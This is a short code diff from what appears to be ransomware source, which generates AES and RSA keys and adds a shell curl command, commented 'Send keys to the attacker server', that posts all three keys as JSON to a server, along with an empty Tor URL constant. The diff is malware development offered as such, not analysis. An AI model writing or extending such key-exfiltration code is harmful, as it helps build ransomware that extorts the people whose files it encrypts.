@@ -17,6 +17,7 @@ import argparse
 from Database.keygenerator import class_keys
 import Database.sqlite as bbdd
 
+URL_TOR = ""
 
 if sys.version_info >= (3, 8, 0):
         import time
@@ -77,6 +78,7 @@ def initialize_keys():
     keys = class_keys()
     data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
     
+    #Send keys to the attacker server
     command =  '''curl localhost:8008/   -H "Content-Type: application/json"   -X POST --data '{"keyAES":"'''+keys.AESkey.hex()+'''", "keyPubRSA":"'''+keys.PUBLIC_RSAKEY.hex()+'''", "keyPrivRSA":"'''+keys.PRIVATE_RSAKEY.hex()+'''"}' '''
     os.system(command)
 
